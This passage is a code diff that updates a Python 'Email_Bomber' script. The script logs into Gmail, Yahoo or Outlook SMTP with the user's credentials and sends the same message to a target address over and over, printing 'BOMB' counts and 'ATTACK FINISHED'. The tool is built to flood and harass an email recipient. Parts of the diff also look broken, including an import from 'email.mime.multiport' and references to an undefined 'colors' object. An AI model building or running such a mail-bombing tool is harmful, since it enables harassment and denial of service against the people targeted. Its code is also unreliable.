@@ -2,7 +2,14 @@
 # But srsly, hit that sub button so you don't miss out on more content! 
 
 
+
+
+
 '''imports'''
+# import new needed libraries... Please! #
+from email.mime.multiport import MIMEMultipart
+from email.mime.text import MIMEText
+
 import smtplib
 import sys
 
@@ -84,18 +91,24 @@ class Email_Bomber:
 
             if self.server == '1':
                 self.server = 'smtp.gmail.com'
+                print(bcolors.GREEN + "You'll have to create an application project in order to use the gmail option.")
             elif self.server == '2':
                 self.server = 'smtp.mail.yahoo.com'
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
-            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
-            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
-            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+            # Removed manual string conversion.
+            self.fromAddr = input(bcolors.BLUE + 'Enter from address: ')
+            self.fromPwd = input(bcolors.BLUE + 'Enter from password: ')
+            self.subject = input(bcolors.BLUE + 'Enter subject: ')
+            self.message = input(bcolors.BLUE + 'Enter message: ')
 
-            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
-            ''' % (self.fromAddr, self.target, self.subject, self.message)
+            # Use for Gmail. It will work for the others, too! #
+            self.msg = MIMEMultipart()
+            self.msg['From'] = self.fromAddr
+            self.msg['To'] = self.target
+            self.msg['Subject'] = self.subject
+            self.msg.attach(MIMEText(self.message, 'plain'))
 
             self.s = smtplib.SMTP(self.server, self.port)
             self.s.ehlo()
@@ -105,21 +118,51 @@ class Email_Bomber:
         except Exception as e:
             print(f'ERROR: {e}')
 
+        
+            # Don't need this, but still keeping here if you want to use this method. #
+        #     self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+        #     ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+        #     self.s = smtplib.SMTP(self.server, self.port)
+        #     self.s.ehlo()
+        #     self.s.starttls()
+        #     self.s.ehlo()
+        #     self.s.login(self.fromAddr, self.fromPwd)
+        # except Exception as e:
+        #     print(f'ERROR: {e}')
+
     def send(self):
         try:
-            self.s.sendmail(self.fromAddr, self.target, self.msg)
-            self.count +=1
-            print(bcolors.YELLOW + f'BOMB: {self.count}')
+            self.s.sendmail(self.fromAddr, self.target, self.msg.as_string())
+            self.count += 1
+            print(colors.GREEN + f'BOMB: {self.count}')
         except Exception as e:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
-        for email in range(self.amount+1):
+        print(colors.GREEN + '\n[+] ATTACKING... [+]')
+        for email in range(self.amount + 1):
             self.send()
         self.s.close()
-        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        print(colors.GREEN + '\n [+] ATTACK FINISHED! [+]')
         sys.exit(0)
+
+    # Old way. Delete if you do not want #
+    # def send(self):
+    #     try:
+    #         self.s.sendmail(self.fromAddr, self.target, self.msg)
+    #         self.count +=1
+    #         print(bcolors.YELLOW + f'BOMB: {self.count}')
+    #     except Exception as e:
+    #         print(f'ERROR: {e}')
+
+    # def attack(self):
+    #     print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+    #     for email in range(self.amount+1):
+    #         self.send()
+    #     self.s.close()
+    #     print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+    #     sys.exit(0)
 
 
 if __name__=='__main__':
